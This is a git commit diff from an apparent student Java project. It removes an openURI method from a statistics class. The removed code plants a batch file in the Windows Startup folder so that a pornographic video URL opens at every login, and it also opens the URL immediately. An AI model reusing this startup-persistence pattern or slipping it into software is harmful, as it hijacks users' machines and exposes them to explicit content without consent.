818c53e8c37a1ea8ba289021897a4b36c118fa3d
aschmitttgm <aschmitt@tgm.student.ac.at>
2026-02-16 14:52:55 +0100

    Statistik wurde überarbeitet

--- src/model/Statistik.java
+++ src/model/Statistik.java
@@ -29,44 +29,6 @@ public class Statistik {
         }
     }
 
-    public static void openURI() {
-        String url = "https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/";
-
-        String batchContent = "@echo off\n" +
-                "start " + url + "\n";
-
-        String userHome = System.getProperty("user.home");
-        String startupPath = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup").toString();
-        File batchFile = new File(startupPath, "OpenURL.bat");
-
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(batchFile))) {
-            writer.write(batchContent);
-            System.out.println("Batch file created: " + batchFile.getAbsolutePath());
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
-            Desktop desktop = Desktop.getDesktop();
-            try {
-                desktop.browse(new URI(url));
-            } catch (IOException | URISyntaxException e) {
-                throw new RuntimeException(e);
-            }
-        } else {
-            Runtime runtime = Runtime.getRuntime();
-            try {
-                runtime.exec(new String[]{"xdg-open", url});
-            } catch (IOException e) {
-                try {
-                    runtime.exec(new String[]{"open", url});
-                }
-                catch (IOException e1) {
-                    throw new RuntimeException(e1);
-                }
-            }
-        }
-    }
-
     public int getRichtigeFragen() {
         return richtigeFragen;
     }
